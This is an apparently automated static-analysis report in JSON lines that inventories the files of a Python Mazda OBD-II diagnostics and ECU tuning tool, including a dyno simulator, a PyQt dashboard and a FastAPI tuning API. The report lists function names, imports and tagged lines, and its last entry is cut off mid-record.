{"file_path": "mazda_tool/core/data_manager.py", "lines_read": 190, "features_found": [{"type": "function", "name": "__init__", "line": 31}, {"type": "function", "name": "register_component", "line": 56}, {"type": "function", "name": "update_live_data", "line": 65}, {"type": "function", "name": "_safety_check", "line": 85}, {"type": "function", "name": "_trigger_safety_event", "line": 125}, {"type": "function", "name": "_execute_safety_protocols", "line": 137}, {"type": "function", "name": "get_vehicle_health_score", "line": 152}, {"type": "function", "name": "_calculate_turbo_health", "line": 168}, {"type": "function", "name": "_calculate_boost_stability", "line": 181}, {"type": "import", "module": "collections", "line": null}, {"type": "import", "module": "PyQt5.QtCore", "line": null}, {"type": "import", "module": "deque,", "line": null}, {"type": "import", "module": "QObject,", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "time", "line": null}], "components_found": [{"type": "class", "name": "MazdaDataManager", "line": 8}], "algorithms": [{"type": "algorithm_function", "line": 168, "content": "def _calculate_turbo_health(self, data_samples):"}, {"type": "algorithm_function", "line": 181, "content": "def _calculate_boost_stability(self, boost_values):"}], "protocols": [{"type": "protocol", "line": 15, "protocol": "OBD", "content": "live_data_updated = pyqtSignal(dict)                    # 10Hz OBD-II data"}, {"type": "protocol", "line": 66, "protocol": "OBD", "content": "\"\"\"Process and distribute live OBD-II data with safety checks\"\"\""}], "hardware_assumptions": [{"type": "hardware", "line": 10, "hardware": "vehicle", "content": "Central nervous system for all Mazda vehicle data flow"}, {"type": "hardware", "line": 18, "hardware": "vehicle", "content": "vehicle_connection_changed = pyqtSignal(bool, str)      # Connection status"}, {"type": "hardware", "line": 38, "hardware": "vehicle", "content": "self.vehicle_health_history = []"}, {"type": "hardware", "line": 47, "hardware": "vehicle", "content": "'vehicle_moving': False,"}, {"type": "hardware", "line": 135, "hardware": "ECU", "content": "self._execute_safety_protocols(event_type, event_data)"}, {"type": "hardware", "line": 137, "hardware": "ECU", "content": "def _execute_safety_protocols(self, event_type, event_data):"}, {"type": "hardware", "line": 138, "hardware": "ECU", "content": "\"\"\"Execute automatic safety protocols for critical events\"\"\""}, {"type": "hardware", "line": 152, "hardware": "vehicle", "content": "def get_vehicle_health_score(self):"}, {"type": "hardware", "line": 153, "hardware": "vehicle", "content": "\"\"\"Calculate comprehensive vehicle health score\"\"\""}, {"type": "hardware", "line": 154, "hardware": "vehicle", "content": "if not self.vehicle_health_history:"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_tool/core/dyno_simulator.py", "lines_read": 206, "features_found": [{"type": "function", "name": "__init__", "line": 12}, {"type": "function", "name": "_build_engine_model", "line": 29}, {"type": "function", "name": "simulate_dyno_run", "line": 48}, {"type": "function", "name": "_apply_tuning_effects", "line": 78}, {"type": "function", "name": "_calculate_performance", "line": 112}, {"type": "function", "name": "_estimate_zero_to_sixty", "line": 133}, {"type": "function", "name": "_estimate_quarter_mile", "line": 146}, {"type": "function", "name": "_analyze_tuning_effects", "line": 158}, {"type": "function", "name": "_assess_tuning_risk", "line": 190}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "logging", "line": null}], "components_found": [{"type": "class", "name": "RealDynoSimulator", "line": 6}], "algorithms": [{"type": "algorithm_function", "line": 112, "content": "def _calculate_performance(self, engine_model: Dict, gear: int) -> Dict:"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 16, "hardware": "vehicle", "content": "self.vehicle_params = {"}, {"type": "hardware", "line": 59, "hardware": "vehicle", "content": "whp_curve = hp_curve * (1 - self.vehicle_params['drivetrain_loss'])"}, {"type": "hardware", "line": 116, "hardware": "vehicle", "content": "max_whp = max_hp * (1 - self.vehicle_params['drivetrain_loss'])"}, {"type": "hardware", "line": 136, "hardware": "vehicle", "content": "force = (max_torque * self.vehicle_params['gear_ratios'][gear-1] *"}, {"type": "hardware", "line": 137, "hardware": "vehicle", "content": "self.vehicle_params['final_drive_ratio'] / self.vehicle_params['wheel_radius_m'])"}, {"type": "hardware", "line": 138, "hardware": "vehicle", "content": "acceleration = force / self.vehicle_params['weight_kg']"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_tool/core/mazdaspeed_knowledge.py", "lines_read": 144, "features_found": [{"type": "function", "name": "__init__", "line": 18}, {"type": "function", "name": "_load_boost_knowledge", "line": 23}, {"type": "function", "name": "_create_tuning_strategies", "line": 36}, {"type": "function", "name": "_load_common_issues", "line": 87}, {"type": "function", "name": "get_tuning_recommendation", "line": 119}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Path", "line": null}], "components_found": [{"type": "class", "name": "TuningStrategy", "line": 8}, {"type": "class", "name": "MazdaspeedKnowledgeEngine", "line": 15}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 16, "hardware": "ECU", "content": "\"\"\"Embed the technical knowledge from your document into executable guidance\"\"\""}, {"type": "hardware", "line": 26, "hardware": "ECU", "content": "\"explanation\": \"ECU uses Load as primary target, Boost is a result\","}], "security_logic": [{"type": "security_pattern", "line": 25, "pattern": "key", "content": "\"key_concept\": \"LOAD_TARGETING_PRIMARY\","}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_tool/core/obd_connection.py", "lines_read": 362, "features_found": [{"type": "function", "name": "__init__", "line": 19}, {"type": "function", "name": "connect_vehicle", "line": 47}, {"type": "function", "name": "disconnect_vehicle", "line": 100}, {"type": "function", "name": "collect_real_live_data", "line": 121}, {"type": "function", "name": "_send_at_command", "line": 163}, {"type": "function", "name": "_send_obd_command", "line": 173}, {"type": "function", "name": "_read_response", "line": 184}, {"type": "function", "name": "_get_rpm", "line": 204}, {"type": "function", "name": "_get_speed", "line": 221}, {"type": "function", "name": "_get_engine_load", "line": 236}, {"type": "function", "name": "_get_throttle_position", "line": 251}, {"type": "function", "name": "_get_intake_temp", "line": 266}, {"type": "function", "name": "_get_coolant_temp", "line": 281}, {"type": "function", "name": "read_diagnostic_codes", "line": 296}, {"type": "function", "name": "_hex_to_dtc", "line": 328}, {"type": "function", "name": "clear_diagnostic_codes", "line": 346}, {"type": "import", "module": "PyQt5.QtCore", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "bluetooth", "line": null}, {"type": "import", "module": "serial", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "QObject,", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "struct", "line": null}], "components_found": [{"type": "class", "name": "AdvancedOBD2Bluetooth", "line": 10}], "algorithms": [], "protocols": [{"type": "protocol", "line": 10, "protocol": "OBD", "content": "class AdvancedOBD2Bluetooth(QObject):"}, {"type": "protocol", "line": 12, "protocol": "OBD", "content": "REAL OBD-II Bluetooth Connection - No Simulations"}, {"type": "protocol", "line": 48, "protocol": "OBD", "content": "\"\"\"Connect to REAL OBD-II Bluetooth adapter\"\"\""}, {"type": "protocol", "line": 50, "protocol": "OBD", "content": "self.logger.info(\"Scanning for OBD-II Bluetooth adapters...\")"}, {"type": "protocol", "line": 57, "protocol": "OBD", "content": "if any(obd_keyword in name.upper() for obd_keyword in ['OBD', 'ELM327', 'Vgate', 'OBDII']):"}, {"type": "protocol", "line": 59, "protocol": "OBD", "content": "self.logger.info(f\"Found OBD adapter: {name} - {addr}\")"}, {"type": "protocol", "line": 62, "protocol": "OBD", "content": "return False, \"No OBD-II Bluetooth adapters found\""}, {"type": "protocol", "line": 82, "protocol": "OBD", "content": "return False, \"OBD adapter connected but vehicle not responding\""}, {"type": "protocol", "line": 90, "protocol": "OBD", "content": "self.logger.info(\"Successfully connected to vehicle via OBD-II\")"}, {"type": "protocol", "line": 122, "protocol": "OBD", "content": "\"\"\"Collect REAL data from OBD-II\"\"\""}, {"type": "protocol", "line": 164, "protocol": "OBD", "content": "\"\"\"Send AT command to OBD adapter\"\"\""}, {"type": "protocol", "line": 174, "protocol": "OBD", "content": "\"\"\"Send OBD PID request\"\"\""}, {"type": "protocol", "line": 174, "protocol": "PID", "content": "\"\"\"Send OBD PID request\"\"\""}, {"type": "protocol", "line": 181, "protocol": "OBD", "content": "self.logger.error(f\"OBD command failed: {pid} - {e}\")"}, {"type": "protocol", "line": 185, "protocol": "OBD", "content": "\"\"\"Read response from OBD adapter\"\"\""}, {"type": "protocol", "line": 334, "protocol": "0x[0-9A-Fa-f]+", "content": "byte1 = (first_int & 0xC0) >> 6"}, {"type": "protocol", "line": 335, "protocol": "0x[0-9A-Fa-f]+", "content": "byte2 = first_int & 0x3F"}, {"type": "protocol", "line": 336, "protocol": "0x[0-9A-Fa-f]+", "content": "byte3 = (second_int & 0xF0) >> 4"}, {"type": "protocol", "line": 337, "protocol": "0x[0-9A-Fa-f]+", "content": "byte4 = second_int & 0x0F"}], "hardware_assumptions": [{"type": "hardware", "line": 13, "hardware": "vehicle", "content": "Only communicates with actual vehicle hardware"}, {"type": "hardware", "line": 47, "hardware": "vehicle", "content": "def connect_vehicle(self) -> tuple:"}, {"type": "hardware", "line": 82, "hardware": "vehicle", "content": "return False, \"OBD adapter connected but vehicle not responding\""}, {"type": "hardware", "line": 90, "hardware": "vehicle", "content": "self.logger.info(\"Successfully connected to vehicle via OBD-II\")"}, {"type": "hardware", "line": 100, "hardware": "vehicle", "content": "def disconnect_vehicle(self) -> tuple:"}, {"type": "hardware", "line": 101, "hardware": "vehicle", "content": "\"\"\"Disconnect from vehicle\"\"\""}, {"type": "hardware", "line": 112, "hardware": "vehicle", "content": "self.data_manager.update_vehicle_state(False)"}, {"type": "hardware", "line": 114, "hardware": "vehicle", "content": "self.logger.info(\"Disconnected from vehicle\")"}, {"type": "hardware", "line": 205, "hardware": "vehicle", "content": "\"\"\"Get REAL RPM from vehicle\"\"\""}, {"type": "hardware", "line": 222, "hardware": "vehicle", "content": "\"\"\"Get REAL speed from vehicle\"\"\""}, {"type": "hardware", "line": 237, "hardware": "vehicle", "content": "\"\"\"Get REAL engine load from vehicle\"\"\""}, {"type": "hardware", "line": 252, "hardware": "vehicle", "content": "\"\"\"Get REAL throttle position from vehicle\"\"\""}], "security_logic": [{"type": "security_pattern", "line": 57, "pattern": "key", "content": "if any(obd_keyword in name.upper() for obd_keyword in ['OBD', 'ELM327', 'Vgate', 'OBDII']):"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_tool/core/real_obd.py", "lines_read": 126, "features_found": [{"type": "function", "name": "__init__", "line": 15}, {"type": "function", "name": "connect_to_vehicle", "line": 37}, {"type": "function", "name": "_setup_watching", "line": 61}, {"type": "function", "name": "_update_data", "line": 69}, {"type": "function", "name": "_format_data", "line": 89}, {"type": "function", "name": "disconnect", "line": 115}, {"type": "import", "module": "PyQt5.QtCore", "line": null}, {"type": "import", "module": "obd", "line": null}, {"type": "import", "module": "QObject,", "line": null}, {"type": "import", "module": "logging", "line": null}], "components_found": [{"type": "class", "name": "RealOBDConnection", "line": 6}], "algorithms": [], "protocols": [{"type": "protocol", "line": 6, "protocol": "OBD", "content": "class RealOBDConnection(QObject):"}, {"type": "protocol", "line": 8, "protocol": "OBD", "content": "REAL OBD-II connection using python-OBD"}, {"type": "protocol", "line": 9, "protocol": "OBD", "content": "Works with Bluetooth OBD adapters on macOS"}, {"type": "protocol", "line": 38, "protocol": "OBD", "content": "\"\"\"Connect to real vehicle via OBD-II\"\"\""}, {"type": "protocol", "line": 40, "protocol": "OBD", "content": "self.logger.info(\"Searching for OBD-II adapter...\")"}, {"type": "protocol", "line": 52, "protocol": "OBD", "content": "self.connection_changed.emit(False, \"No OBD adapter found\")"}, {"type": "protocol", "line": 70, "protocol": "OBD", "content": "\"\"\"Update data from OBD connection\"\"\""}, {"type": "protocol", "line": 90, "protocol": "OBD", "content": "\"\"\"Convert OBD data to our application format\"\"\""}], "hardware_assumptions": [{"type": "hardware", "line": 37, "hardware": "vehicle", "content": "def connect_to_vehicle(self):"}, {"type": "hardware", "line": 38, "hardware": "vehicle", "content": "\"\"\"Connect to real vehicle via OBD-II\"\"\""}, {"type": "hardware", "line": 48, "hardware": "vehicle", "content": "self.connection_changed.emit(True, \"Connected to vehicle\")"}, {"type": "hardware", "line": 49, "hardware": "vehicle", "content": "self.logger.info(\"Successfully connected to vehicle\")"}, {"type": "hardware", "line": 116, "hardware": "vehicle", "content": "\"\"\"Disconnect from vehicle\"\"\""}, {"type": "hardware", "line": 124, "hardware": "vehicle", "content": "self.logger.info(\"Disconnected from vehicle\")"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_tool/main.py", "lines_read": 80, "features_found": [{"type": "function", "name": "main", "line": 74}, {"type": "function", "name": "__init__", "line": 14}, {"type": "function", "name": "setup_application", "line": 23}, {"type": "function", "name": "load_stylesheet", "line": 41}, {"type": "function", "name": "run", "line": 51}, {"type": "import", "module": "PyQt5.QtWidgets", "line": null}, {"type": "import", "module": "PyQt5.QtCore", "line": null}, {"type": "import", "module": "PyQt5.QtGui", "line": null}, {"type": "import", "module": "mazda_tool.ui.main_window", "line": null}, {"type": "import", "module": "mazda_tool.core.config_manager", "line": null}, {"type": "import", "module": "mazda_tool.utils.logger", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "QApplication,", "line": null}, {"type": "import", "module": "QSettings,", "line": null}, {"type": "import", "module": "QIcon", "line": null}, {"type": "import", "module": "UltimateMazdaTechnicianSuite", "line": null}, {"type": "import", "module": "ConfigManager", "line": null}, {"type": "import", "module": "setup_logging", "line": null}], "components_found": [{"type": "class", "name": "MazdaTechnicianTool", "line": 13}], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_tool/modules/__init__.py", "lines_read": 1, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_tool/ui/__init__.py", "lines_read": 1, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_tool/ui/ai_learning_tab.py", "lines_read": 73, "features_found": [{"type": "function", "name": "__init__", "line": 5}, {"type": "function", "name": "setup_obd_connections", "line": 15}, {"type": "function", "name": "process_real_data", "line": 20}, {"type": "function", "name": "update_live_display", "line": 34}, {"type": "function", "name": "start_ai_learning", "line": 51}], "components_found": [{"type": "class", "name": "AILearningTab", "line": 2}], "algorithms": [], "protocols": [{"type": "protocol", "line": 3, "protocol": "OBD", "content": "\"\"\"AI Learning Tab with Real OBD Integration\"\"\""}, {"type": "protocol", "line": 16, "protocol": "OBD", "content": "\"\"\"Connect to OBD data signals\"\"\""}, {"type": "protocol", "line": 21, "protocol": "OBD", "content": "\"\"\"Process REAL OBD data for AI learning\"\"\""}, {"type": "protocol", "line": 35, "protocol": "OBD", "content": "\"\"\"Update the display with real OBD data\"\"\""}, {"type": "protocol", "line": 36, "protocol": "OBD", "content": "display_text = \"\ud83d\udcca LIVE OBD DATA:\\n\\n\""}, {"type": "protocol", "line": 52, "protocol": "OBD", "content": "\"\"\"Start AI learning with real OBD data\"\"\""}, {"type": "protocol", "line": 64, "protocol": "OBD", "content": "\"Collecting real driving data from OBD-II...\\n\""}], "hardware_assumptions": [{"type": "hardware", "line": 55, "hardware": "vehicle", "content": "\"Please connect to a vehicle first.\")"}], "security_logic": [], "dead_or_disabled_code": [{"type": "todo", "line": 31, "content": "# TODO: Send to AI engine for analysis"}], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_tool/ui/diagnostic_dashboard.py", "lines_read": 190, "features_found": [{"type": "function", "name": "__init__", "line": 13}, {"type": "function", "name": "setup_ui", "line": 27}, {"type": "function", "name": "create_health_indicator", "line": 110}, {"type": "function", "name": "create_parameter_display", "line": 140}, {"type": "function", "name": "update_display", "line": 159}, {"type": "import", "module": "PyQt5.QtWidgets", "line": null}, {"type": "import", "module": "PyQt5.QtCore", "line": null}, {"type": "import", "module": "PyQt5.QtGui", "line": null}, {"type": "import", "module": "(QWidget,", "line": null}, {"type": "import", "module": "Qt,", "line": null}, {"type": "import", "module": "QFont,", "line": null}], "components_found": [{"type": "class", "name": "DiagnosticDashboard", "line": 8}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 32, "hardware": "vehicle", "content": "health_group = QGroupBox(\"Vehicle Health Overview\")"}, {"type": "hardware", "line": 111, "hardware": "vehicle", "content": "\"\"\"Create a health indicator widget for a vehicle system\"\"\""}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["diagnostic"]}
{"file_path": "mazda_tool/ui/help_system.py", "lines_read": 128, "features_found": [{"type": "function", "name": "__init__", "line": 12}, {"type": "function", "name": "setup_ui", "line": 17}, {"type": "function", "name": "load_topics", "line": 49}, {"type": "function", "name": "display_topic", "line": 62}, {"type": "function", "name": "display_load_vs_boost", "line": 77}, {"type": "function", "name": "display_high_hp_strategies", "line": 120}, {"type": "function", "name": "search_content", "line": 124}, {"type": "import", "module": "PyQt5.QtWidgets", "line": null}, {"type": "import", "module": "PyQt5.QtCore", "line": null}, {"type": "import", "module": "PyQt5.QtGui", "line": null}, {"type": "import", "module": "mazda_tool.core.mazdaspeed_knowledge", "line": null}, {"type": "import", "module": "(QWidget,", "line": null}, {"type": "import", "module": "Qt", "line": null}, {"type": "import", "module": "QFont", "line": null}, {"type": "import", "module": "MazdaspeedKnowledgeEngine", "line": null}], "components_found": [{"type": "class", "name": "MazdaspeedHelpSystem", "line": 9}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 85, "hardware": "ECU", "content": "<li>The ECU uses Load as its <b>primary performance target</b>, NOT boost pressure</li>"}, {"type": "hardware", "line": 107, "hardware": "ECU", "content": "The ECU uses the final Load Target to determine:"}], "security_logic": [{"type": "security_pattern", "line": 115, "pattern": "key", "content": "<b>KEY INSIGHT:</b> You tune for Load, and Boost follows!"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_tool/ui/main_window.py", "lines_read": 58, "features_found": [{"type": "function", "name": "__init__", "line": 3}, {"type": "function", "name": "setup_cross_component_connections", "line": 20}, {"type": "function", "name": "handle_global_connection_change", "line": 49}], "components_found": [{"type": "class", "name": "UltimateMazdaTechnicianSuite", "line": 2}], "algorithms": [], "protocols": [{"type": "protocol", "line": 12, "protocol": "OBD", "content": "self.obd_connection = AdvancedOBD2Bluetooth(self.data_manager)"}], "hardware_assumptions": [{"type": "hardware", "line": 45, "hardware": "vehicle", "content": "self.data_manager.vehicle_connection_changed.connect("}, {"type": "hardware", "line": 50, "hardware": "ABS", "content": "\"\"\"Enable/disable features across all tabs based on connection\"\"\""}, {"type": "hardware", "line": 56, "hardware": "vehicle", "content": "self.status_label.setText(\"Vehicle connected - All features enabled\")"}, {"type": "hardware", "line": 58, "hardware": "vehicle", "content": "self.status_label.setText(\"Vehicle disconnected - Features limited\")"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_tool/utils/__init__.py", "lines_read": 1, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_tool/utils/logger.py", "lines_read": 18, "features_found": [{"type": "function", "name": "setup_logging", "line": 6}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "Path", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_tuner_api.py", "lines_read": 843, "features_found": [{"type": "function", "name": "get_api", "line": 825}, {"type": "function", "name": "create_app", "line": 833}, {"type": "function", "name": "__init__", "line": 110}, {"type": "function", "name": "_setup_middleware", "line": 150}, {"type": "function", "name": "_setup_routes", "line": 161}, {"type": "function", "name": "set_telemetry", "line": 791}, {"type": "function", "name": "set_ai_tuner", "line": 796}, {"type": "function", "name": "set_ecu_exploiter", "line": 801}, {"type": "function", "name": "set_database", "line": 806}, {"type": "function", "name": "run", "line": 811}, {"type": "function", "name": "get_app", "line": 816}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "fastapi", "line": null}, {"type": "import", "module": "fastapi.security", "line": null}, {"type": "import", "module": "fastapi.middleware.cors", "line": null}, {"type": "import", "module": "fastapi.responses", "line": null}, {"type": "import", "module": "pydantic", "line": null}, {"type": "import", "module": "models", "line": null}, {"type": "import", "module": "real_time_telemetry", "line": null}, {"type": "import", "module": "real_time_ai_tuner", "line": null}, {"type": "import", "module": "real_time_tuning_session", "line": null}, {"type": "import", "module": "mazda_ecu_exploiter", "line": null}, {"type": "import", "module": "secure_database", "line": null}, {"type": "import", "module": "mazda_security_core", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "FastAPI,", "line": null}, {"type": "import", "module": "HTTPBearer,", "line": null}, {"type": "import", "module": "CORSMiddleware", "line": null}, {"type": "import", "module": "JSONResponse", "line": null}, {"type": "import", "module": "BaseModel,", "line": null}, {"type": "import", "module": "uvicorn", "line": null}, {"type": "import", "module": "(", "line": null}, {"type": "import", "module": "RealTimeTelemetry,", "line": null}, {"type": "import", "module": "RealTimeAITuner,", "line": null}, {"type": "import", "module": "RealTimeTuningSession,", "line": null}, {"type": "import", "module": "MazdaECUExploiter", "line": null}, {"type": "import", "module": "SecureDatabase", "line": null}, {"type": "import", "module": "MazdaSecurityCore", "line": null}], "components_found": [{"type": "class", "name": "TelemetryResponse", "line": 36}, {"type": "class", "name": "TuningTargetRequest", "line": 59}, {"type": "class", "name": "SessionStartRequest", "line": 69}, {"type": "class", "name": "SessionResponse", "line": 76}, {"type": "class", "name": "APIResponse", "line": 88}, {"type": "class", "name": "ErrorResponse", "line": 96}, {"type": "class", "name": "MazdaTunerAPI", "line": 104}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 3, "hardware": "ECU", "content": "Provides REST endpoints for telemetry, AI tuning, ECU operations, and session management."}, {"type": "hardware", "line": 16, "hardware": "ECU", "content": "from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials"}, {"type": "hardware", "line": 24, "hardware": "ECU", "content": "SecurityLevel, SecurityCredentials, FlashOperation, FlashState,"}, {"type": "hardware", "line": 25, "hardware": "ECU", "content": "VehicleState, ECUState, DiagnosticTroubleCode"}, {"type": "hardware", "line": 25, "hardware": "vehicle", "content": "VehicleState, ECUState, DiagnosticTroubleCode"}, {"type": "hardware", "line": 30, "hardware": "ECU", "content": "from mazda_ecu_exploiter import MazdaECUExploiter"}, {"type": "hardware", "line": 31, "hardware": "ECU", "content": "from secure_database import SecureDatabase"}, {"type": "hardware", "line": 32, "hardware": "ECU", "content": "from mazda_security_core import MazdaSecurityCore"}, {"type": "hardware", "line": 40, "hardware": "vehicle", "content": "vehicle_speed: Optional[float] = None"}, {"type": "hardware", "line": 132, "hardware": "ECU", "content": "self.security = HTTPBearer()"}, {"type": "hardware", "line": 133, "hardware": "ECU", "content": "self.security_core = MazdaSecurityCore()"}, {"type": "hardware", "line": 138, "hardware": "ECU", "content": "self.ecu_exploiter: Optional[MazdaECUExploiter] = None"}, {"type": "hardware", "line": 139, "hardware": "ECU", "content": "self.database: Optional[SecureDatabase] = None"}, {"type": "hardware", "line": 180, "hardware": "ECU", "content": "credentials = SecurityCredentials("}, {"type": "hardware", "line": 182, "hardware": "ECU", "content": "password_hash=\"\",  # Will be validated by security core"}, {"type": "hardware", "line": 183, "hardware": "ECU", "content": "security_level=SecurityLevel.USER,"}, {"type": "hardware", "line": 188, "hardware": "ECU", "content": "auth_result = await self.security_core.authenticate_user(username, password)"}, {"type": "hardware", "line": 192, "hardware": "ECU", "content": "session_token = self.security_core.create_session_token(credentials)"}, {"type": "hardware", "line": 219, "hardware": "ECU", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "hardware", "line": 244, "hardware": "ECU", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "hardware", "line": 269, "hardware": "ECU", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "hardware", "line": 305, "hardware": "ECU", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "hardware", "line": 341, "hardware": "ECU", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "hardware", "line": 384, "hardware": "ECU", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "hardware", "line": 418, "hardware": "ECU", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "hardware", "line": 445, "hardware": "ECU", "content": "@self.app.get(\"/ecu/status\", response_model=APIResponse)"}, {"type": "hardware", "line": 446, "hardware": "ECU", "content": "async def get_ecu_status("}, {"type": "hardware", "line": 447, "hardware": "ECU", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "hardware", "line": 449, "hardware": "ECU", "content": "\"\"\"Get ECU status.\"\"\""}, {"type": "hardware", "line": 452, "hardware": "ECU", "content": "if not self.ecu_exploiter:"}, {"type": "hardware", "line": 455, "hardware": "ECU", "content": "detail=\"ECU exploiter not available\""}, {"type": "hardware", "line": 459, "hardware": "ECU", "content": "ecu_status = self.ecu_exploiter.get_ecu_status()"}, {"type": "hardware", "line": 462, "hardware": "ECU", "content": "message=\"ECU status retrieved\","}, {"type": "hardware", "line": 463, "hardware": "ECU", "content": "data=ecu_status"}, {"type": "hardware", "line": 467, "hardware": "ECU", "content": "self.logger.error(f\"Failed to get ECU status: {e}\")"}, {"type": "hardware", "line": 470, "hardware": "ECU", "content": "detail=\"Failed to retrieve ECU status\""}, {"type": "hardware", "line": 473, "hardware": "ECU", "content": "@self.app.post(\"/ecu/backup\", response_model=APIResponse)"}, {"type": "hardware", "line": 474, "hardware": "ECU", "content": "async def backup_ecu("}, {"type": "hardware", "line": 476, "hardware": "ECU", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "hardware", "line": 478, "hardware": "ECU", "content": "\"\"\"Create ECU backup.\"\"\""}, {"type": "hardware", "line": 481, "hardware": "ECU", "content": "if not self.ecu_exploiter:"}, {"type": "hardware", "line": 484, "hardware": "ECU", "content": "detail=\"ECU exploiter not available\""}, {"type": "hardware", "line": 488, "hardware": "ECU", "content": "backup_result = await self.ecu_exploiter.backup_ecu()"}, {"type": "hardware", "line": 493, "hardware": "ECU", "content": "message=\"ECU backup created\","}, {"type": "hardware", "line": 499, "hardware": "ECU", "content": "detail=f\"ECU backup failed: {backup_result.error_message}\""}, {"type": "hardware", "line": 503, "hardware": "ECU", "content": "self.logger.error(f\"Failed to backup ECU: {e}\")"}, {"type": "hardware", "line": 506, "hardware": "ECU", "content": "detail=\"Failed to create ECU backup\""}, {"type": "hardware", "line": 509, "hardware": "ECU", "content": "@self.app.get(\"/ecu/dtc\", response_model=APIResponse)"}, {"type": "hardware", "line": 511, "hardware": "ECU", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "hardware", "line": 516, "hardware": "ECU", "content": "if not self.ecu_exploiter:"}, {"type": "hardware", "line": 519, "hardware": "ECU", "content": "detail=\"ECU exploiter not available\""}, {"type": "hardware", "line": 523, "hardware": "ECU", "content": "dtc_codes = await self.ecu_exploiter.read_dtcs()"}, {"type": "hardware", "line": 541, "hardware": "ECU", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "hardware", "line": 562, "hardware": "ECU", "content": "session.set_ecu_exploiter(self.ecu_exploiter)"}, {"type": "hardware", "line": 603, "hardware": "ECU", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "hardware", "line": 630, "hardware": "ECU", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "hardware", "line": 649, "hardware": "ECU", "content": "message=\"Full session execution started\","}, {"type": "hardware", "line": 657, "hardware": "ECU", "content": "detail=\"Failed to start session execution\""}, {"type": "hardware", "line": 663, "hardware": "ECU", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "hardware", "line": 696, "hardware": "ECU", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "hardware", "line": 725, "hardware": "ECU", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "hardware", "line": 756, "hardware": "ECU", "content": "is_valid = self.security_core.validate_session_token(token)"}, {"type": "hardware", "line": 801, "hardware": "ECU", "content": "def set_ecu_exploiter(self, ecu_exploiter: MazdaECUExploiter) -> 